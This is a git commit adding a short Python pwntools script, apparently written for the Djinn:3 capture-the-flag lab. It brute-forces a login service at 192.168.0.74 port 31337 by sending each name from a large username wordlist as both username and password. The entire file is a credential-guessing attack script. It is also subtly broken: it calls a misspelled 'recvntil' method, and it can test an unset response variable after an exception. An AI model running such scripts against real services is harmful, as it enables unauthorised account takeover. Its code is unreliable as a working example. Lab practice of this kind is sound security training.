92bae21df08447acc373f2c20dd204c303133f9a
whoami-GA <122873067+whoami-GA@users.noreply.github.com>
2023-08-06 23:55:16 +0300

    Create Djinn:3.py

---
+++ Djinn:3.py
@@ -0,0 +1,48 @@
+ #!/usr/bin/python3
+ 
+ from pwn import *
+ import sys, time, pdb, signal
+ 
+ 
+ def def_handler(sig, frame):
+     print("\n\n[!]Exit\n")
+     sys.exit(1)
+ 
+ # Ctrl+C 
+ signal.signal(signal.SIGINT, def_handler)
+ 
+ if __name__ == '__main__':
+ 
+     host, port = "192.168.0.74", 31337
+ 
+     f = open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", "rb")
+ 
+     p1 = log.progress("Brute Force")
+     p1.status("Starting Brute Force")
+ 
+     time.sleep(2)
+ 
+     for username in f.readlines():
+         
+         username = username.strip()
+         password = username
+         
+         p1.status("Combination %s:%s" % (username.decode(),password.decode()))
+ 
+         try:
+ 
+             s = remote(host ,port)
+ 
+             s.recvntil(b"username> ")
+             s.sendline(username)
+             s.recvntil(b"password> ")
+             s.sendline(password)
+ 
+             response = s.recv()
+ 
+         except:
+             time.sleep(2)
+ 
+         if b"authentication failed" not in response:
+             p1.success("Has Succesfull This Credentials %s:%s" % (username.decode(), password.decode()))
+             sys.exit(0)
